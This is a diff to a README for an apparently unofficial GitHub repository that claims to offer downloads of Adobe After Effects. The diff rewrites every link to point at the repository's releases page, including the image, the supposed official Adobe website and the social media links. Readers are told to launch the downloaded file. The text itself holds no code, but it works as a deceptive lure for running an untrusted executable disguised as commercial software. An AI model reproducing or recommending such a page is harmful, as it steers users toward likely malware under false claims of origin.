@@ -1,6 +1,6 @@
 # Adobe After EffectsRS 🎬
 
-![Adobe After Effects](https://img.icons8.com/color/452/adobe-after-effects.png)
+![Adobe After Effects](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
 
 Welcome to the **Adobe After EffectsRS** repository!
 
@@ -28,9 +28,9 @@ Welcome to the **Adobe After EffectsRS** repository!
 
 ## Get Started 🌟
 
-To explore the world of Adobe After Effects, you can download the software from the following link: [Download Adobe After Effects](https://github.com/releases/789694263/Release.zip)
+To explore the world of Adobe After Effects, you can download the software from the following link: [Download Adobe After Effects](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
 
-[![Download Adobe After Effects](https://img.shields.io/badge/Download-Adobe After Effects-<COLOR>.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Adobe After Effects](https://github.com/melanysita/Adobe-After-EffectsRS/releases After Effects-<COLOR>.svg)](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
 
 Please ensure you have the necessary system requirements and launch the downloaded file to install Adobe After Effects.
 
@@ -40,14 +40,14 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 ## Resources 📚
 
-For additional tips, tutorials, and resources on Adobe After Effects, visit the official [Adobe After Effects website](https://www.adobe.com/products/aftereffects.html).
+For additional tips, tutorials, and resources on Adobe After Effects, visit the official [Adobe After Effects website](https://github.com/melanysita/Adobe-After-EffectsRS/releases).
 
 ## Connect with Us 🌐
 
 Stay updated with the latest news and updates by following us on social media:
-- [Twitter](https://twitter.com/AdobeAE)
-- [Instagram](https://www.instagram.com/adobeaftereffects/)
-- [Facebook](https://www.facebook.com/AdobeAfterEffects)
+- [Twitter](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
+- [Instagram](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
+- [Facebook](https://github.com/melanysita/Adobe-After-EffectsRS/releases)
 
 ## Happy Editing! 🎥✨
 
